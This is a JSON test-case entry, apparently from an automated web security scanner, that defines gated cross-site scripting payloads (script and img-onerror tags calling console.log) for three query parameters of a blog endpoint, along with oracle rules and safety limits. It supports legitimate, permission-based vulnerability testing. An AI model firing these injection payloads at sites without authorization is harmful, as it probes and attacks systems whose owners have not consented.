    {
      "id": "TC-CHAIN-004-conditional-exploit-trigger",
      "hypothesis_id": "H002_post-H003_post",
      "base_url": "https://{{host}}",
      "method": "GET",
      "endpoint": "/blog/post",
      "parameter": "(postId,scanMeHeader,viewport)",
      "payloads": [
        {
          "tier": "exploit",
          "payloads": [
            {
              "location": "query.postId",
              "value": "<img src=x onerror=console.log('XSS')>"
            },
            {
              "location": "query.scanMeHeader",
              "value": "<script>console.log(1)</script>"
            },
            {
              "location": "query.viewport",
              "value": "\"><script>console.log('DOM')</script>"
            }
          ],
          "description": "Exploit-tier payloads executed only if prior probe signals reflected_input or DOM injection detected. High-safety gating enforced.",
          "header": [
            {
              "header_name": "User-Agent",
              "header_value": "Mozilla/5.0 (compatible)"
            }
          ]
        }
      ],
      "prerequisites": [
        {
          "type": "custom",
          "description": "Require positive reflection signal from TC-CHAIN-002 (reflected_input) or individual XSS probes. Executor must verify oracle results before running.",
          "custom_logic": "proceed_only_if_any_previous_oracle_reflected_input_true"
        }
      ],
      "oracle_rules": [
        {
          "signal": "xss_payload_executed",
          "condition": "Manual or automated confirmation required: if exploit payload appears unescaped or evidence of script execution is observed in subsequent responses or application behavior, mark as successful.",
          "threshold": {
            "expected_codes": [
              200
            ]
          },
          "weight": 1.0
        }
      ],
      "pass_logic": "any",
      "safety": {
        "idempotent_required": true,
        "destructive_ok": false,
        "max_requests": 4
      },
      "max_retries": 1,
      "delay_between_requests": 1.0,
      "notes": "Do not execute without explicit positive probe results. These payloads are higher-risk; run under manual supervision or with permission. Use same session/cookie as used during probes.",
      "tags": [
        "xss",
        "exploit",
        "conditional"
      ],
      "estimated_duration": 30
    },
    {
